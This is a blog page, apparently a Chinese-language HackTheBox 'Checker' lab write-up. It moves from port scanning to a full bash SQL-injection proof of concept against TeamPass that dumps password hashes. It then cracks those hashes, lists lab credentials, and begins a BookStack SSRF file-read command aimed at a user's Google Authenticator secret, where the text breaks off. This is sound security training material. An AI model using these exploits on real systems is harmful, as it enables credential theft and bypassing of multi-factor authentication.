<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-200c8fb703c11799.js" defer=""></script><script src="/_next/static/QNwQRHKrBrKUQsk8ffFzs/_buildManifest.js" defer=""></script><script src="/_next/static/QNwQRHKrBrKUQsk8ffFzs/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2026<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxSeason7-Checker","contentHtml":"\u003ch1\u003eSeason7-Checker\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/competitive/7/overview\"\u003ehttps://app.hackthebox.com/competitive/7/overview\u003c/a\u003e | \u003ccode\u003ehard\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cp\u003e首先将\u003ccode\u003echecker.htb\u003c/code\u003e添加到\u003ccode\u003ehosts\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 10.10.11.56    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 08:03 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.56\nHost is up (0.21s latency).\nNot shown: 65053 filtered tcp ports (no-response), 479 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8080/tcp open  http-proxy\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 68.70 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  nmap -sT -A -T4 -O -p 22,80,8080 10.10.11.56  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 08:06 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.56\nHost is up (0.20s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)\n|_  256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)\n80/tcp   open  http    Apache httpd\n|_http-title: 403 Forbidden\n|_http-server-header: Apache\n8080/tcp open  http    Apache httpd\n|_http-server-header: Apache\n|_http-title: 403 Forbidden\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   397.46 ms 10.10.16.1\n2   397.58 ms 10.10.11.56\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 33.63 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  nmap -script=vuln -p 80,8080 10.10.11.56    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 08:07 EST\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nStats: 0:04:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan\nPORT     STATE SERVICE\n80/tcp   open  http\n|_http-dombased-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any DOM based XSS.\n|_http-stored-xss: Couldn'\u003c/span\u003et find any stored XSS vulnerabilities.\n|_http-csrf: Couldn\u003cspan class=\"hljs-string\"\u003e't find any CSRF vulnerabilities.\n8080/tcp open  http-proxy\n\nNmap done: 1 IP address (1 host up) scanned in 294.05 seconds\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问\u003ccode\u003e10.10.11.56:8080\u003c/code\u003e端口回会加载\u003ccode\u003evault.checker.htb\u003c/code\u003e将写入\u003ccode\u003ehosts\u003c/code\u003e文件\u003c/p\u003e\n\u003cp\u003e扫描子域名，无结果（但是其实会返回\u003ccode\u003e429\u003c/code\u003e，过多的请求，大概率是不要我们去扫描了）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/checker  wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt --hl=7,8 -H \u003cspan class=\"hljs-string\"\u003e'Host:FUZZ.checker.\nhtb'\u003c/span\u003e -u checker.htb                                                                                                                                          \n********************************************************                                                                                                     \n* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                     \n********************************************************                                                                                                     \n                                                                                                                                                             \nTarget: http://checker.htb/                                                                                                                                  \nTotal requests: 4989                                                                                                                                         \n                                                                                                                                                             \n=====================================================================                                                                                        \nID           Response   Lines    Word       Chars       Payload                                                                                              \n=====================================================================                                                                                        \n                                                                              \n                                                                                                                                                             \nTotal \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e: 0                                                                                                                                                \nProcessed Requests: 4989                                                                                                                                     \nFiltered Requests: 4989                                                                                                                                      \nRequests/sec.: 0                     \n\n⚡ root@kali  ~/Desktop/test/checker  wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt --hl=7,8 -H \u003cspan class=\"hljs-string\"\u003e'Host:FUZZ.checker.\nhtb:8080'\u003c/span\u003e -u checker.htb:8080           \n********************************************************                                                                                                     \n* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                     \n********************************************************                                                                                                     \n                                                                                                                                                             \nTarget: http://checker.htb:8080/                                                                                                                             \nTotal requests: 4989                                                                                                                                         \n                                                                                                                                                             \n=====================================================================                                                                                        \nID           Response   Lines    Word       Chars       Payload                                                                                              \n=====================================================================          \nTotal \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e: 0                                                                                                                                                \nProcessed Requests: 4989                                                                                                                                     \nFiltered Requests: 4989                                                                                                                                      \nRequests/sec.: 0                                                                                                                                             \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问\u003ccode\u003eHTTP\u003c/code\u003e服务，进来就是一个输入框，\u003ccode\u003eBookStack\u003c/code\u003e 使用 PHP 和 Laravel 构建的创建文档/wiki 内容的平台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e访问\u003ccode\u003e8080\u003c/code\u003e端口，也是登录框，\u003ccode\u003eteampass\u003c/code\u003e  协作密码管理器\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eTeamPass 利用\u003c/h2\u003e\n\u003cp\u003e经查阅\u003ccode\u003eTeampass\u003c/code\u003e存在\u003ccode\u003eSQL\u003c/code\u003e注入漏洞： \u003ca href=\"https://huntr.com/bounties/942c015f-7486-49b1-94ae-b1538d812bc2\"\u003ehttps://huntr.com/bounties/942c015f-7486-49b1-94ae-b1538d812bc2\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003ePOC：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e [ \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$#\u003c/span\u003e\"\u003c/span\u003e -lt 1 ]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Usage: \u003cspan class=\"hljs-variable\"\u003e$0\u003c/span\u003e \u0026#x3C;base-url\u003e\"\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e 1\n\u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e\n\nvulnerable_url=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e/api/index.php/authorize\"\u003c/span\u003e\n\ncheck=$(curl --silent \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$vulnerable_url\u003c/span\u003e\"\u003c/span\u003e)\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$check\u003c/span\u003e\"\u003c/span\u003e | grep -q \u003cspan class=\"hljs-string\"\u003e\"API usage is not allowed\"\u003c/span\u003e; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"API feature is not enabled :-(\"\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e 1\n\u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# htpasswd -bnBC 10 \"\" h4ck3d | tr -d ':\\n'\u003c/span\u003e\narbitrary_hash=\u003cspan class=\"hljs-string\"\u003e'$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq'\u003c/span\u003e\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eexec_sql\u003c/span\u003e\u003c/span\u003e() {\n  inject=\u003cspan class=\"hljs-string\"\u003e\"none' UNION SELECT id, '\u003cspan class=\"hljs-variable\"\u003e$arbitrary_hash\u003c/span\u003e', (\u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin\"\u003c/span\u003e\n  data=\u003cspan class=\"hljs-string\"\u003e\"{\\\"login\\\":\\\"\"\u003c/span\u003e\u003cspan class=\"hljs-variable\"\u003e$inject\u003c/span\u003e\\\"\u003cspan class=\"hljs-string\"\u003e\",\\\"password\\\":\\\"h4ck3d\\\", \\\"apikey\\\": \\\"foo\\\"}\"\u003c/span\u003e\n  token=$(curl --silent --header \u003cspan class=\"hljs-string\"\u003e\"Content-Type: application/json\"\u003c/span\u003e -X POST --data \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$data\u003c/span\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$vulnerable_url\u003c/span\u003e\"\u003c/span\u003e | jq -r \u003cspan class=\"hljs-string\"\u003e'.token'\u003c/span\u003e)\n  \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e $(\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$token\u003c/span\u003e| \u003cspan class=\"hljs-built_in\"\u003ecut\u003c/span\u003e -d\u003cspan class=\"hljs-string\"\u003e\".\"\u003c/span\u003e -f2 | \u003cspan class=\"hljs-built_in\"\u003ebase64\u003c/span\u003e -d 2\u003e/dev/null | jq -r \u003cspan class=\"hljs-string\"\u003e'.public_key'\u003c/span\u003e)\n}\n\n\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e=$(exec_sql \u003cspan class=\"hljs-string\"\u003e\"SELECT COUNT(*) FROM teampass_users WHERE pw != ''\"\u003c/span\u003e)\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"There are \u003cspan class=\"hljs-variable\"\u003e$users\u003c/span\u003e users in the system:\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e `\u003cspan class=\"hljs-built_in\"\u003eseq\u003c/span\u003e 0 $((\u003cspan class=\"hljs-variable\"\u003e$users\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e))`; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e\n  username=$(exec_sql \u003cspan class=\"hljs-string\"\u003e\"SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT \u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e,1\"\u003c/span\u003e)\n  password=$(exec_sql \u003cspan class=\"hljs-string\"\u003e\"SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT \u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e,1\"\u003c/span\u003e)\n  \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$username\u003c/span\u003e: \u003cspan class=\"hljs-variable\"\u003e$password\u003c/span\u003e\"\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功读到用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/checker  ./poc.sh checker.htb:8080\nThere are 2 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the system:\nadmin: $2y$10\u003cspan class=\"hljs-variable\"\u003e$lKCae0EIUNj6f96ZnLqnC\u003c/span\u003e.LbWqrBQCT1LuHEFht6PmE4yH75rpWya\nbob: $2y$10\u003cspan class=\"hljs-variable\"\u003e$yMypIj1keU\u003c/span\u003e.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003ejohn\u003c/code\u003e爆破，得到\u003ccode\u003ebob\u003c/code\u003e密码\u003ccode\u003echeerleader\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/checker  john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt\nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\ncheerleader      (?)     \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e登陆后台，成功进入\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e还可以找到\u003ccode\u003eBookStack\u003c/code\u003e的账号密码 \u003ccode\u003ebob@checker.htb\u003c/code\u003e : \u003ccode\u003emYSeCr3T_w1kI_P4sSw0rD\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e还可以找到\u003ccode\u003eSSH\u003c/code\u003e的账号密码 \u003ccode\u003ereader\u003c/code\u003e : \u003ccode\u003ehiccup-publicly-genesis\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e登录\u003ccode\u003eSSH\u003c/code\u003e ，输入密码后还要输入\u003ccode\u003eVerification code\u003c/code\u003e (\u003ccode\u003eMFA\u003c/code\u003e 双因子认证登录)\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eBookStack\u003c/h2\u003e\n\u003cp\u003e拿到\u003ccode\u003ebob\u003c/code\u003e用户凭据登录\u003ccode\u003eBookStack\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e试了一下\u003ccode\u003eBookStack\u003c/code\u003e 添加书籍时插入代码，但是不成功\u003c/p\u003e\n\u003cp\u003e到\u003ccode\u003eBookStack\u003c/code\u003e的官网下找文档，发现里面有\u003ccode\u003eMFA\u003c/code\u003e认证，可能是和\u003ccode\u003eheader\u003c/code\u003e的有关\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.bookstackapp.com/docs/admin/security/#multi-factor-authentication\"\u003ehttps://www.bookstackapp.com/docs/admin/security/#multi-factor-authentication\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在个人界面里面也能找到 \u003ccode\u003eSetup Multi-Factor Authentication\u003c/code\u003e 选项\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image20.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e底下的的\u003ccode\u003eBackup Codes\u003c/code\u003e （将以下代码列表存储在安全的地方。访问系统时，您将能够将其中一个代码用作第二个身份验证机制）但是在我使用脚本尝试了很多次之后都无法进入，拼尽全力无法战胜（香蕉猫）\u003c/p\u003e\n\u003cp\u003e继续进行信息收集，在\u003ccode\u003eadmin\u003c/code\u003e写的\u003ccode\u003eLinux-security\u003c/code\u003e发现一个路径\u003ccode\u003e/backup/home_backup\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image21.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e找到一个SSRF漏洞：\u003ca href=\"https://fluidattacks.com/advisories/imagination/\"\u003ehttps://fluidattacks.com/advisories/imagination/\u003c/a\u003e | \u003ca href=\"https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/\"\u003ehttps://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eA server-side request forgery (SSRF) vulnerability has been identified in Book Stack that, under certain conditions, could allow an attacker to obtain local files from the server. The attacker must have writer permissions. | 某些条件下攻击者可以获取本地文件\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e根据漏洞报告可以找到利用工具：\u003ca href=\"https://github.com/synacktiv/php_filter_chains_oracle_exploit\"\u003ehttps://github.com/synacktiv/php_filter_chains_oracle_exploit\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e读取的文件是：\u003ccode\u003e/backup/home_backup/home/reader/.google_authenticator\u003c/code\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e这个文件包含了与 Google Authenticator 相关的密钥和配置信息。每个用户在启用 2FA 时，Google Authenticator 会生成一个密钥，并将其保存到 \u003ccode\u003e.google_authenticator\u003c/code\u003e 文件中。这个密钥是用来生成 TOTP 的核心数据\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// POC\npython filters_chain_oracle_exploit.py \\\n  --target \u003cspan class=\"hljs-string\"\u003e\"http://checker.htb/ajax/page/12/save-draft\"\u003c/span\u003e \\\n  --file \u003cspan class=\"hljs-string\"\u003e\"/backup/home_backup/home/reader/.google_authenticator\"\u003c/span\u003e \\\n  --parameter \u003cspan class=\"hljs-string\"\u003e\"html\"\u003c/span\u003e \\\n  --verb PUT \\\n  --headers 